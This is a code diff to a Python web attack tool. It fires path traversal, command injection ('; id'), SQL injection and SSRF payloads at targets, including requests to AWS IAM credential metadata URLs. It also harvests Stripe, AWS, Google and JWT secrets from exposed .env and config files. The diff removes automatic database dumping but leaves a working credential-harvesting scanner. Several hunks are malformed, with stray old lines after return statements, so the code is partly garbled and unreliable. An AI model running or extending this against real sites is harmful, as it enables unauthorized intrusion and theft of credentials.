@@ -121,12 +121,10 @@ def is_html_response(text: str, headers: dict = None) -> bool:
 
 def validate_stripe_key(token: str) -> bool:
     """Validate EXACT Stripe key format."""
-    if token.startswith('sk_live_') and len(token) == 32:
-        return token[8:].replace('_', '').replace('-', '').isalnum()
-    if token.startswith('pk_live_') and len(token) == 32:
-        return token[8:].replace('_', '').replace('-', '').isalnum()
-    if token.startswith('sk_test_') and len(token) == 32:
-        return token[8:].replace('_', '').replace('-', '').isalnum()
+    if token.startswith('sk_live_') or token.startswith('pk_live_') or token.startswith('sk_test_'):
+        prefix_len = 8
+        remainder = token[prefix_len:]
+        return len(remainder) == 24 and remainder.isalnum()
     return False
 
 def validate_aws_key(token: str) -> bool:
@@ -200,6 +198,182 @@ def is_placeholder_value(value: str) -> bool:
     if value.startswith('${') and value.endswith('}'):
         return True
     if value.startswith('{{') and value.endswith('}}'):
+        return True
+    
+    return False
+
+def response_hash(text: str) -> str:
+    """Generate hash of response for deduplication."""
+    return hashlib.md5(text[:1024].encode('utf-8', errors='ignore')).hexdigest()
+
+def is_high_entropy(text: str, min_entropy: float = 3.5) -> bool:
+    """Check if string has high entropy (likely secret)."""
+    if len(text) < 16:
+        return False
+    
+    # Calculate Shannon entropy
+    import math
+    entropy = 0.0
+    for x in range(256):
+        p_x = float(text.count(chr(x))) / len(text)
+        if p_x > 0:
+            entropy += - p_x * math.log2(p_x)
+    
+    return entropy >= min_entropy
+
+def validate_git_file(content: str, filename: str) -> bool:
+    """Validate .git file format."""
+    if filename == '.git/HEAD':
+        return content.startswith('ref:') and 'refs/' in content
+    elif filename == '.git/config':
+        return '[core]' in content or 'repositoryformatversion' in content
+    elif filename == '.git/index':
+        return content.startswith('DIRC') or len(content) > 12
+    return len(content) > 0
+
+def validate_env_file(content: str) -> bool:
+    """Validate .env file format: must have KEY=VALUE pairs."""
+    lines = [l.strip() for l in content.split('\n') if l.strip() and not l.strip().startswith('#')]
+    if not lines:
+        return False
+    
+    # At least 50% of lines must be KEY=VALUE format
+    valid_pairs = 0
+    for line in lines:
+        if '=' in line:
+            key, value = line.split('=', 1)
+            if key.strip() and value.strip():
+                valid_pairs += 1
+    
+    return valid_pairs >= len(lines) * 0.5
+
+def validate_cloud_metadata(text: str) -> tuple:
+    """Validate cloud metadata format. Returns (cloud_type, extracted_data) or (None, {})."""
+    if not text or len(text) < 10:
+        return (None, {})
+    
+    text_lower = text.lower()
+    
+    # AWS metadata
+    if 'ami-' in text or 'instance-id' in text_lower:
+        try:
+            data = json.loads(text)
+            if isinstance(data, dict) and any(k in data for k in ['instanceId', 'privateIp', 'region', 'accountId']):
+                return ('AWS', data)
+        except:
+            pass
+        
+        # Plaintext format
+        lines = text.strip().split('\n')
+        aws_keys = ['ami-id', 'ami-launch-index', 'instance-id', 'instance-type', 'local-hostname']
+        if any(line in aws_keys for line in lines):
+            return ('AWS', {'metadata_keys': lines[:10]})
+    
+    # Azure metadata
+    if 'vmid' in text_lower or 'subscriptionid' in text_lower:
+        try:
+            data = json.loads(text)
+            if isinstance(data, dict) and 'compute' in data:
+                compute = data['compute']
+                if isinstance(compute, dict) and any(k in compute for k in ['vmId', 'location', 'subscriptionId']):
+                    return ('Azure', data)
+        except:
+            pass
+    
+    # GCP metadata
+    if 'project-id' in text or ('instance' in text_lower and 'zone' in text_lower):
+        lines = text.strip().split('\n')
+        if 'project-id' in lines or any('projects/' in line for line in lines):
+            return ('GCP', {'metadata': text[:200]})
+    
+    return (None, {})
+
+def validate_sql_error(text: str) -> tuple:
+    """Validate SQL error signature. Returns (db_type, error_context) or (None, '')."""
+    text_lower = text.lower()
+    
+    sql_signatures = [
+        ('MySQL', ['you have an error in your sql', 'mysql_fetch', 'mysqli::', 'mysql_num_rows']),
+        ('PostgreSQL', ['pg_query', 'pg_exec', 'postgresql query failed', 'unterminated quoted string at']),
+        ('MSSQL', ['microsoft sql server', 'odbc sql server', 'sqlserver jdbc', 'unclosed quotation mark after']),
+        ('Oracle', ['ora-', 'oracle error', 'oracle.jdbc']),
+        ('SQLite', ['sqlite3::', 'sqlite_', 'unrecognized token', 'near "'])
+    ]
+    
+    for db_type, sigs in sql_signatures:
+        for sig in sigs:
+            if sig in text_lower:
+                # Extract error context
+                idx = text_lower.find(sig)
+                context = text[max(0, idx-100):idx+200]
+                
+                # Verify SQL context (must have SQL keywords nearby)
+                context_lower = context.lower()
+                if any(word in context_lower for word in ['select', 'where', 'from', 'syntax', 'query', 'sql', 'line', 'column']):
+                    return (db_type, context)
+    
+    return (None, '')
+
+def validate_backup_file(content_bytes: bytes, filename: str) -> bool:
+    """Validate backup file magic bytes."""
+    if len(content_bytes) < 8:
+        return False
+    
+    # Check magic bytes
+    magic = content_bytes[:8]
+    
+    # ZIP: PK\x03\x04
+    if magic[:4] == b'PK\x03\x04':
+        return True
+    
+    # GZIP: \x1f\x8b
+    if magic[:2] == b'\x1f\x8b':
+        return True
+    
+    # TAR: "ustar" at offset 257
+    if len(content_bytes) > 265 and content_bytes[257:262] == b'ustar':
+        return True
+    
+    # SQL dump: must contain SQL keywords
+    try:
+        text = content_bytes[:2048].decode('utf-8', errors='ignore').lower()
+        if any(keyword in text for keyword in ['create table', 'insert into', '-- dump', 'mysqldump', 'pg_dump']):
+            return True
+    except:
+        pass
+    
+    return False
+
+def validate_passwd(text: str) -> bool:
+    """Validate /etc/passwd format: root:x:0:0:root:/root:/bin/bash"""
+    lines = text.split('\n')
+    
+    for line in lines:
+        if line.startswith('root:'):
+            parts = line.split(':')
+            if len(parts) >= 7:
+                # parts[2] = UID, parts[3] = GID (must be numeric)
+                if parts[2].isdigit() and parts[3].isdigit():
+                    return True
+    
+    return False
+
+def validate_command_output(text: str) -> bool:
+    """Validate command execution output: uid=X(user) gid=Y(group)"""
+    import re
+    text_lower = text.lower()
+    
+    # Check for 'id' command output
+    if 'uid=' in text_lower and 'gid=' in text_lower:
+        if re.search(r'uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)', text_lower):
+            return True
+    
+    # Check for Windows command markers
+    if 'volume serial number' in text_lower or 'directory of' in text_lower:
+        return True
+    
+    # Check for Unix shell output patterns
+    if text_lower.count('\n') > 2 and any(marker in text_lower for marker in ['/root', '/home/', '/usr/bin', '/bin/bash']):
         return True
     
     return False
@@ -397,7 +571,7 @@ class CodeWordAttacks:
     # FAM - File Access Modifier (Path Traversal/LFI/RFI)
     # ─────────────────────────────────────────────────────────────────────
     def attack_FAM(self, target: str) -> List[Vulnerability]:
-        """Path traversal and file inclusion attacks"""
+        """Path traversal and file inclusion attacks - STRICT /etc/passwd VALIDATION"""
         vulns = []
         
         # Path traversal payloads
@@ -418,45 +592,40 @@ class CodeWordAttacks:
                     url = f"{target}?{param}={payload}"
                     r = self.session.get(url, timeout=5)
                     
-                    # STRICT check for successful file read - must match /etc/passwd or win.ini format
-                    is_actual_file = False
-                    
-                    # /etc/passwd format: username:x:uid:gid:comment:home:shell
-                    if 'root:' in r.text:
-                        lines = r.text.split('\n')
-                        for line in lines:
-                            if line.startswith('root:') and line.count(':') >= 6:
-                                # Verify it's passwd format: root:x:0:0:...
-                                parts = line.split(':')
-                                if len(parts) >= 7 and parts[2].isdigit() and parts[3].isdigit():
-                                    is_actual_file = True
-                                    break
-                    
-                    # Windows win.ini format: [section] with key=value pairs
-                    elif '[extensions]' in r.text or '[fonts]' in r.text:
-                        # Check for actual INI format
-                        if '\n' in r.text and '=' in r.text:
-                            is_actual_file = True
-                    
-                    # Linux binaries/paths
-                    elif '/bin/bash' in r.text or '/bin/sh' in r.text:
-                        # Verify it's in passwd-like context
-                        if 'root:' in r.text or ':0:0:' in r.text:
-                            is_actual_file = True
-                    
-                    if is_actual_file:
+                    # STRICT validation: must match /etc/passwd or win.ini format
+                    if validate_passwd(r.text):
                         vulns.append(Vulnerability(
                             type="FAM_PATH_TRAVERSAL",
                             severity="CRITICAL",
                             location=f"?{param}=",
                             payload=payload,
                             evidence=r.text[:200],
-                            description=f"Path traversal vulnerability allows reading arbitrary files",
+                            description=f"Path traversal vulnerability allows reading /etc/passwd",
                             remediation="Validate and sanitize file paths, use whitelist approach",
                             exploitable=True,
                             exploit_code=f"curl '{url}'"
                         ))
+                        print(Colors.critical(f"\n      [💀 PATH TRAVERSAL] {param}= → /etc/passwd VALIDATED"))
                         break
+                    
+                    # Windows win.ini format: [section] with key=value pairs
+                    elif '[extensions]' in r.text or '[fonts]' in r.text:
+                        # Check for actual INI format
+                        if '\n' in r.text and '=' in r.text and not is_html_response(r.text, dict(r.headers)):
+                            vulns.append(Vulnerability(
+                                type="FAM_PATH_TRAVERSAL",
+                                severity="CRITICAL",
+                                location=f"?{param}=",
+                                payload=payload,
+                                evidence=r.text[:200],
+                                description=f"Path traversal vulnerability allows reading win.ini",
+                                remediation="Validate and sanitize file paths, use whitelist approach",
+                                exploitable=True,
+                                exploit_code=f"curl '{url}'"
+                            ))
+                            print(Colors.critical(f"\n      [💀 PATH TRAVERSAL] {param}= → win.ini VALIDATED"))
+                            break
+                    
                     time.sleep(self.config.delay)
                 except:
                     pass
@@ -467,59 +636,42 @@ class CodeWordAttacks:
     # PCM - Process Chain Manager (Command Injection)
     # ─────────────────────────────────────────────────────────────────────
     def attack_PCM(self, target: str) -> List[Vulnerability]:
-        """OS command injection attacks"""
+        """OS command injection attacks - STRICT uid/gid OUTPUT VALIDATION"""
         vulns = []
         
         cmd_payloads = [
+            '; id',
+            '| id',
+            '`id`',
+            '$(id)',
             '; whoami',
-            '| whoami',
-            '`whoami`',
-            '$(whoami)',
-            '; ping -c 3 127.0.0.1',
-            '&& whoami',
+            '&& id',
         ]
         
         test_params = ['cmd', 'command', 'exec', 'execute', 'run', 'ping', 'host']
         
         for param in test_params:
-            for payload in cmd_payloads[:3]:
+            for payload in cmd_payloads[:4]:
                 try:
                     url = f"{target}?{param}={quote(payload)}"
                     r = self.session.get(url, timeout=5)
                     
-                    # STRICT command execution verification - must match actual command output format
-                    is_command_exec = False
-                    response_lower = r.text.lower()
-                    
-                    # Check for 'id' or 'whoami' command output
-                    if 'uid=' in response_lower and 'gid=' in response_lower:
-                        # Must match exact format: uid=X(username) gid=Y(groupname)
-                        import re
-                        if re.search(r'uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)', response_lower):
-                            is_command_exec = True
-                    
-                    # Check for Windows command output markers
-                    elif 'volume serial number' in response_lower or 'directory of' in response_lower:
-                        is_command_exec = True
-                    
-                    # Check for Unix command success markers
-                    elif response_lower.count('\n') > 3 and any(marker in response_lower for marker in ['/root', '/home/', '/usr/bin']):
-                        # Likely 'ls' or file listing output
-                        is_command_exec = True
-                    
-                    if is_command_exec:
+                    # STRICT command execution validation
+                    if validate_command_output(r.text):
                         vulns.append(Vulnerability(
                             type="PCM_COMMAND_INJECTION",
                             severity="CRITICAL",
                             location=f"?{param}=",
                             payload=payload,
                             evidence=r.text[:200],
-                            description="OS command injection vulnerability",
+                            description="OS command injection vulnerability - VALIDATED uid/gid output",
                             remediation="Never pass user input to shell commands, use safe APIs",
                             exploitable=True,
                             exploit_code=f"curl '{url}'"
                         ))
+                        print(Colors.critical(f"\n      [💀 COMMAND INJECTION] {param}= → VALIDATED uid/gid OUTPUT"))
                         break
+                    
                     time.sleep(self.config.delay)
                 except:
                     pass
@@ -527,10 +679,10 @@ class CodeWordAttacks:
         return vulns
     
     # ─────────────────────────────────────────────────────────────────────
-    # ACS - Application Configuration Store (Config File Exposure) - WITH STRICT SECRET VALIDATION
+    # ACS - Application Configuration Store (Config File Exposure) - STRICT KEY=VALUE + SECRET VALIDATION
     # ─────────────────────────────────────────────────────────────────────
     def attack_ACS(self, target: str) -> List[Vulnerability]:
-        """Configuration file and secret exposure - ONLY report VALIDATED secrets"""
+        """Configuration file and secret exposure - ONLY report if REAL KEY=VALUE secrets pass validation"""
         vulns = []
         
         config_files = [
@@ -551,64 +703,88 @@ class CodeWordAttacks:
                     # PHASE 2: Verify it's NOT HTML/SPA fallback
                     if not is_html_response(r.text, dict(r.headers)):
                         
-                        # PHASE 3: Extract ACTUAL secrets (not just keywords)
+                        # PHASE 3: Extract VALIDATED secrets only
                         import re
-                        extracted_secrets = {}
+                        validated_secrets = {}
                         
-                        # For .env files, validate key=value format
+                        # For .env files, validate KEY=VALUE format with SECRET validation
                         if file_path.startswith('/.env'):
+                            # Must pass .env format validation first
+                            if not validate_env_file(r.text):
+                                continue
+                            
                             for line in r.text.split('\n'):
                                 line = line.strip()
                                 if not line or line.startswith('#') or '=' not in line:
                                     continue
                                 
-                                key, value = line.split('=', 1)
-                                key = key.strip()
-                                value = value.strip().strip('"\'')
-                                
-                                # Skip invalid keys
-                                if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{1,80}", key):
-                                    continue
-                                
-                                # Skip placeholders
-                                if is_placeholder_value(value) or len(value) < 8:
-                                    continue
-                                
-                                # Extract if key looks secret-related
-                                if re.search(r'(secret|private|key|token|password|api|database|connection)', key, re.I):
-                                    # Validate the actual value format
+                                try:
+                                    key, value = line.split('=', 1)
+                                    key = key.strip()
+                                    value = value.strip().strip('"\'')
+                                    
+                                    # Skip invalid keys or placeholders
+                                    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{1,80}", key):
+                                        continue
+                                    
+                                    if is_placeholder_value(value) or len(value) < 8:
+                                        continue
+                                    
+                                    # STRICT validation for each secret format
                                     if validate_stripe_key(value):
-                                        extracted_secrets[key] = 'STRIPE_KEY'
+                                        validated_secrets[key] = ('STRIPE_KEY', value[:20] + '...')
                                     elif validate_aws_key(value):
-                                        extracted_secrets[key] = 'AWS_KEY'
+                                        validated_secrets[key] = ('AWS_KEY', value)
                                     elif validate_google_api_key(value):
-                                        extracted_secrets[key] = 'GOOGLE_API_KEY'
+                                        validated_secrets[key] = ('GOOGLE_API_KEY', value[:20] + '...')
                                     elif validate_jwt_token(value):
-                                        extracted_secrets[key] = 'JWT_TOKEN'
-                                    elif len(value) > 20:  # Generic secret (long enough)
-                                        extracted_secrets[key] = f'SECRET ({len(value)} chars)'
+                                        validated_secrets[key] = ('JWT_TOKEN', value[:30] + '...')
+                                    # For generic secrets, require high entropy AND secret-related key name
+                                    elif re.search(r'(secret|private|key|token|password|api|database|connection)', key, re.I):
+                                        if len(value) > 20 and is_high_entropy(value):
+                                            validated_secrets[key] = ('SECRET', f'{len(value)} chars, high entropy')
+                                except:
+                                    pass
                         
                         else:
-                            # For other config files, extract known secret patterns
+                            # For other config files, extract and validate known patterns
                             api_patterns = {
-                                'API_KEY': r'(?:api[_-]?key|apikey)\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})["\']?',
-                                'SECRET': r'(?:secret|secret_key)\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})["\']?',
-                                'TOKEN': r'(?:token|auth_token)\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})["\']?',
-                                'PASSWORD': r'(?:password|passwd|pwd)\s*[:=]\s*["\']?([^"\'\s]{8,})["\']?',
-                                'AWS_KEY': r'(?:aws_access_key_id|AWS_ACCESS_KEY_ID)\s*[:=]\s*["\']?(AKIA[0-9A-Z]{16})["\']?',
+                                'STRIPE_KEY': (r'(sk_live_[A-Za-z0-9]{24}|pk_live_[A-Za-z0-9]{24})', validate_stripe_key),
+                                'AWS_KEY': (r'(AKIA[0-9A-Z]{16})', validate_aws_key),
+                                'GOOGLE_API_KEY': (r'(AIza[0-9A-Za-z_-]{35})', validate_google_api_key),
+                                'JWT_TOKEN': (r'(eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,})', validate_jwt_token),
                             }
                             
-                            for secret_type, pattern in api_patterns.items():
-                                matches = re.findall(pattern, r.text, re.IGNORECASE)
-                                if matches:
-                                    real_secrets = []
-                                    for m in matches:
-                                        # Skip placeholders
-                                        if not is_placeholder_value(m):
-                                            # Validate format if applicable
-                                            if secret_type == 'AWS_KEY' and validate_aws_key(m):
-                                                real_secrets.append(m)
-                                            elif secret_type != 'AWS_KEY' and len(m) > 10:
+                            for secret_type, (pattern, validator) in api_patterns.items():
+                                matches = re.findall(pattern, r.text)
+                                for match in matches:
+                                    m_str = match if isinstance(match, str) else match[0]
+                                    if not is_placeholder_value(m_str) and validator(m_str):
+                                        validated_secrets[f'{secret_type}_{len(validated_secrets)}'] = (secret_type, m_str[:30] + '...')
+                        
+                        # ONLY report if we have VALIDATED secrets
+                        if validated_secrets:
+                            evidence_lines = []
+                            for key, (vtype, vprev) in list(validated_secrets.items())[:10]:
+                                evidence_lines.append(f"{key}: {vtype} ({vprev})")
+                            
+                            vulns.append(Vulnerability(
+                                type="ACS_CONFIG_SECRETS_EXPOSED",
+                                severity="CRITICAL",
+                                location=file_path,
+                                evidence='\n'.join(evidence_lines),
+                                description=f"Config file exposed with {len(validated_secrets)} VALIDATED secrets",
+                                remediation="Block access to config files, rotate all exposed credentials",
+                                exploitable=True
+                            ))
+                            
+                            print(Colors.critical(f"\n      [💀 CONFIG SECRETS] {file_path}: {len(validated_secrets)} VALIDATED"))
+                
+                time.sleep(self.config.delay)
+            except:
+                pass
+        
+        return vulns
                                                 real_secrets.append(m)
                                     
                                     if real_secrets:
@@ -678,7 +854,7 @@ class CodeWordAttacks:
     # DAM - Directory Access Monitor (Directory Listing/Backup Files) - WITH VERIFICATION
     # ─────────────────────────────────────────────────────────────────────
     def attack_DAM(self, target: str) -> List[Vulnerability]:
-        """Directory listing and backup file discovery - ONLY report if actually downloadable"""
+        """Directory listing and backup file discovery - STRICT MAGIC BYTE VALIDATION"""
         vulns = []
         
         # Test for directory listing
@@ -710,10 +886,11 @@ class CodeWordAttacks:
             except:
                 pass
         
-        # Test for backup files - VERIFY DOWNLOADABILITY
+        # Test for backup files - STRICT MAGIC BYTE VALIDATION
         backup_files = [
             '/backup.zip', '/backup.tar.gz', '/site.zip', '/www.zip',
-            '/db.sql', '/database.sql', '/dump.sql', '/backup.sql'
+            '/db.sql', '/database.sql', '/dump.sql', '/backup.sql',
+            '/site.tar', '/backup.tar', '/www.tar.gz'
         ]
         
         for backup in backup_files:
@@ -726,26 +903,22 @@ class CodeWordAttacks:
                     content_type = r.headers.get('content-type', '').lower()
                     content_length = int(r.headers.get('content-length', 0))
                     
-                    # PHASE 2: Verify it's an actual file, not HTML/SPA
-                    # Backup files should NOT be text/html and should have reasonable size
-                    if 'text/html' not in content_type or content_length > 100000:
-                        # Read first 512 bytes to verify file type
-                        first_chunk = next(r.iter_content(chunk_size=512), b'')
-                        
-                        # Verify it's not HTML by checking first bytes
-                        is_html = first_chunk.strip().startswith(b'<!DOCTYPE') or first_chunk.strip().startswith(b'<html')
-                        
-                        if not is_html:
-                            # Valid backup file found!
-                            vulns.append(Vulnerability(
-                                type="DAM_BACKUP_FILE_EXPOSED",
-                                severity="CRITICAL",
-                                location=backup,
-                                description=f"Backup file accessible and downloadable: {backup}",
-                                evidence=f"Size: {content_length} bytes, Type: {content_type}",
-                                remediation="Remove backup files from public web directory",
-                                exploitable=True
-                            ))
+                    # PHASE 2: Read first 512 bytes to check magic bytes
+                    first_chunk = next(r.iter_content(chunk_size=512), b'')
+                    
+                    # PHASE 3: STRICT magic byte validation
+                    if validate_backup_file(first_chunk, backup):
+                        vulns.append(Vulnerability(
+                            type="DAM_BACKUP_FILE_EXPOSED",
+                            severity="CRITICAL",
+                            location=backup,
+                            description=f"Backup file accessible and downloadable: {backup}",
+                            evidence=f"Size: {content_length} bytes, Type: {content_type}, Validated magic bytes",
+                            remediation="Remove backup files from public web directory",
+                            exploitable=True,
+                            exploit_code=f"curl -O '{url}'"
+                        ))
+                        print(Colors.critical(f"\n      [💀 BACKUP FOUND] {backup} ({content_length} bytes) - MAGIC BYTES VALIDATED"))
                 
                 time.sleep(self.config.delay)
             except:
@@ -900,108 +1073,72 @@ class WebExploitationArsenal:
         return vulns
     
     # ─────────────────────────────────────────────────────────────────────
-    # SQL INJECTION - 100+ PAYLOADS + AUTO DATABASE DUMP
+    # SQL INJECTION - STRICT ERROR VALIDATION + BASELINE COMPARISON
     # ─────────────────────────────────────────────────────────────────────
     def attack_sqli(self, target: str) -> List[Vulnerability]:
-        """SQL Injection - WITH AUTOMATIC DATABASE DUMPING"""
+        """SQL Injection - STRICT error signature validation, NO automatic dumping"""
         vulns = []
         
         # Error-based SQLi payloads
         error_payloads = [
             "' OR '1'='1",
             "' OR '1'='1'--",
-            "' OR '1'='1'/*",
             "admin'--",
-            "admin'#",
             "' OR 1=1--",
             "') OR ('1'='1",
-            "') OR ('1'='1'--",
-            "1' OR '1' = '1",
-            "' OR 'x'='x",
             "\" OR \"1\"=\"1",
-            "\" OR \"1\"=\"1\"--",
         ]
         
-        # Union-based SQLi for data extraction
-        union_payloads = [
-            "' UNION SELECT NULL--",
-            "' UNION SELECT NULL,NULL--",
-            "' UNION SELECT NULL,NULL,NULL--",
-            "' UNION SELECT NULL,NULL,NULL,NULL--",
-            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
-        ]
-        
-        test_params = ['id', 'user', 'username', 'email', 'search', 'query', 'page', 'category']
-        test_endpoints = ['/api/user', '/api/auth', '/user', '/login', '/search', '/products', '/article']
+        test_params = ['id', 'user', 'username', 'email', 'search', 'query', 'page']
+        test_endpoints = ['/api/user', '/api/auth', '/user', '/login', '/search', '/products']
         
         print(Colors.info(f"    [→] Testing {len(test_endpoints)} endpoints for SQLi..."))
         
         for endpoint in test_endpoints:
             for param in test_params[:3]:  # Test top 3 params
-                # PHASE 1: Error-based detection
-                for payload in error_payloads[:10]:  # Top 10 payloads
-                    try:
-                        url = f"{urljoin(target, endpoint)}?{param}={quote(payload)}"
-                        r = self.session.get(url, timeout=5)
-                        
-                        # STRICT SQL error detection
-                        sql_error_patterns = [
-                            ('mysql', ['you have an error in your sql', 'mysql_fetch', 'mysql_num_rows', 'mysqli::']),
-                            ('postgresql', ['pg_query', 'pg_exec', 'postgresql query failed', 'unterminated quoted string']),
-                            ('mssql', ['microsoft sql server', 'odbc sql server', 'sqlserver jdbc', 'unclosed quotation mark']),
-                            ('oracle', ['ora-', 'oracle error', 'oracle.jdbc']),
-                            ('sqlite', ['sqlite3::', 'sqlite_', 'unrecognized token'])
-                        ]
-                        
-                        found_real_error = False
-                        db_type = None
-                        response_lower = r.text.lower()
-                        
-                        for detected_db, error_sigs in sql_error_patterns:
-                            for sig in error_sigs:
-                                if sig in response_lower:
-                                    error_context = response_lower[max(0, response_lower.find(sig)-100):response_lower.find(sig)+200]
-                                    if any(sql_word in error_context for sql_word in ['select', 'where', 'from', 'syntax', 'query', 'line']):
-                                        found_real_error = True
-                                        db_type = detected_db
-                                        break
-                            if found_real_error:
-                                break
-                        
-                        if found_real_error:
-                            print(Colors.critical(f"\n      [🔥 SQLi FOUND] {endpoint}?{param}= - {db_type.upper()} database"))
+                try:
+                    # PHASE 1: Get baseline response
+                    baseline_url = f"{urljoin(target, endpoint)}?{param}=1"
+                    baseline_r = self.session.get(baseline_url, timeout=5)
+                    baseline_hash = response_hash(baseline_r.text)
+                    
+                    # PHASE 2: Test with SQLi payloads
+                    for payload in error_payloads[:6]:  # Top 6 payloads
+                        try:
+                            test_url = f"{urljoin(target, endpoint)}?{param}={quote(payload)}"
+                            test_r = self.session.get(test_url, timeout=5)
+                            test_hash = response_hash(test_r.text)
                             
-                            # PHASE 2: AUTOMATIC DATABASE ENUMERATION
-                            print(Colors.critical(f"      [💀 AUTO-DUMPING] Attempting database extraction..."))
+                            # Must be different from baseline
+                            if test_hash == baseline_hash:
+                                continue
                             
-                            extracted_data = {}
+                            # PHASE 3: STRICT SQL error validation
+                            db_type, error_context = validate_sql_error(test_r.text)
                             
-                            # Try to get table names
-                            if db_type == 'mysql':
-                                table_payloads = [
-                                    "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
-                                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
-                                ]
-                            elif db_type == 'postgresql':
-                                table_payloads = [
-                                    "' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--",
-                                ]
-                            elif db_type == 'sqlite':
-                                table_payloads = [
-                                    "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
-                                ]
-                            else:
-                                table_payloads = union_payloads[:3]
+                            if db_type:
+                                vulns.append(Vulnerability(
+                                    type="SQLI_ERROR_BASED",
+                                    severity="CRITICAL",
+                                    location=f"{endpoint}?{param}=",
+                                    payload=payload,
+                                    evidence=error_context[:300],
+                                    description=f"SQL Injection vulnerability detected - {db_type} database error",
+                                    remediation="Use parameterized queries, never concatenate user input",
+                                    exploitable=True,
+                                    exploit_code=f"sqlmap -u '{urljoin(target, endpoint)}?{param}=1' --batch"
+                                ))
+                                
+                                print(Colors.critical(f"\n      [💀 SQLi → {db_type}] {endpoint}?{param}= - ERROR SIGNATURE VALIDATED"))
+                                break  # Found SQLi, move to next param
                             
-                            # Attempt to extract tables
-                            for table_payload in table_payloads:
-                                try:
-                                    url_extract = f"{urljoin(target, endpoint)}?{param}={quote(table_payload)}"
-                                    r_extract = self.session.get(url_extract, timeout=5)
-                                    
-                                    if r_extract.status_code == 200 and len(r_extract.text) > 100:
-                                        # Check if we got table names (look for common table names)
-                                        common_tables = ['users', 'user', 'admin', 'customers', 'accounts', 'products', 'orders']
+                            time.sleep(self.config.delay)
+                        except:
+                            pass
+                except:
+                    pass
+        
+        return vulns
                                         found_tables = [t for t in common_tables if t in r_extract.text.lower()]
                                         
                                         if found_tables:
@@ -1134,10 +1271,10 @@ class WebExploitationArsenal:
 
     
     # ─────────────────────────────────────────────────────────────────────
-    # SSRF ATTACKS - DEEP CLOUD METADATA SCRAPING - WITH STRICT JSON VALIDATION
+    # SSRF ATTACKS - STRICT CLOUD METADATA VALIDATION
     # ─────────────────────────────────────────────────────────────────────
     def attack_ssrf(self, target: str) -> List[Vulnerability]:
-        """Server-Side Request Forgery - WITH STRICT CLOUD METADATA FORMAT VALIDATION"""
+        """Server-Side Request Forgery - STRICT cloud metadata format validation (AWS/Azure/GCP)"""
         vulns = []
         
         print(Colors.info(f"    [→] Testing SSRF + Cloud metadata endpoints..."))
@@ -1147,32 +1284,26 @@ class WebExploitationArsenal:
             # AWS Metadata
             ('http://169.254.169.254/latest/meta-data/', 'AWS EC2 Metadata'),
             ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS IAM Credentials'),
-            ('http://169.254.169.254/latest/user-data/', 'AWS User Data'),
             ('http://169.254.169.254/latest/dynamic/instance-identity/document', 'AWS Instance Identity'),
             
             # GCP Metadata
-            ('http://metadata.google.internal/computeMetadata/v1/', 'GCP Metadata'),
-            ('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', 'GCP Service Account Token'),
             ('http://metadata.google.internal/computeMetadata/v1/project/project-id', 'GCP Project ID'),
+            ('http://metadata.google.internal/computeMetadata/v1/instance/id', 'GCP Instance ID'),
             
             # Azure Metadata
             ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'Azure Instance Metadata'),
-            ('http://169.254.169.254/metadata/identity/oauth2/token', 'Azure Identity Token'),
             
             # Internal services
             ('http://localhost:6379', 'Redis'),
             ('http://localhost:3306', 'MySQL'),
-            ('http://localhost:5432', 'PostgreSQL'),
-            ('http://localhost:27017', 'MongoDB'),
-            ('http://localhost:9200', 'Elasticsearch'),
         ]
         
-        test_params = ['url', 'target', 'redirect', 'callback', 'webhook', 'link', 'src', 'fetch', 'uri', 'path']
-        test_endpoints = ['/api/fetch', '/api/proxy', '/api/webhook', '/api/callback', '/api/import', '/proxy']
+        test_params = ['url', 'target', 'redirect', 'callback', 'webhook', 'fetch', 'uri']
+        test_endpoints = ['/api/fetch', '/api/proxy', '/api/webhook', '/api/import', '/proxy']
         
         for endpoint in test_endpoints:
-            for param in test_params[:5]:
-                for payload_url, description in ssrf_payloads[:10]:  # Test top 10 payloads
+            for param in test_params[:4]:
+                for payload_url, description in ssrf_payloads[:8]:  # Test top 8 payloads
                     try:
                         url = f"{urljoin(target, endpoint)}?{param}={quote(payload_url)}"
                         r = self.session.get(url, timeout=5)
@@ -1181,41 +1312,29 @@ class WebExploitationArsenal:
                         if r.status_code == 200 and not is_html_response(r.text, dict(r.headers)):
                             
                             # PHASE 2: STRICT cloud metadata format validation
-                            response_text = r.text or ""
-                            cloud_type = None
-                            extracted_data = {}
+                            cloud_type, extracted_data = validate_cloud_metadata(r.text)
                             
-                            # AWS Metadata Format Validation
-                            if 'ami-' in response_text or 'instance-id' in response_text:
-                                try:
-                                    # Try JSON format
-                                    data = json.loads(response_text)
-                                    if isinstance(data, dict) and ('instanceId' in data or 'privateIp' in data or 'region' in data):
-                                        cloud_type = 'aws'
-                                        extracted_data = data
-                                except:
-                                    # Try plaintext format (newline-separated keys)
-                                    lines = response_text.strip().split('\n')
-                                    if any(line in ['ami-id', 'ami-launch-index', 'instance-id', 'instance-type'] for line in lines):
-                                        cloud_type = 'aws'
-                                        extracted_data = {'metadata_keys': lines[:10]}
-                            
-                            # Azure Metadata Format Validation
-                            elif 'vmId' in response_text or 'subscriptionId' in response_text:
-                                try:
-                                    data = json.loads(response_text)
-                                    if isinstance(data, dict) and 'compute' in data:
-                                        compute = data['compute']
-                                        if isinstance(compute, dict) and ('vmId' in compute or 'location' in compute):
-                                            cloud_type = 'azure'
-                                            extracted_data = data
-                                except:
-                                    pass
-                            
-                            # GCP Metadata Format Validation
-                            elif 'project-id' in response_text or 'instance-id' in response_text:
-                                lines = response_text.strip().split('\n')
-                                if 'project-id' in lines or 'instance-id' in lines:
+                            if cloud_type:
+                                vulns.append(Vulnerability(
+                                    type="SSRF_CLOUD_METADATA_EXPOSED",
+                                    severity="CRITICAL",
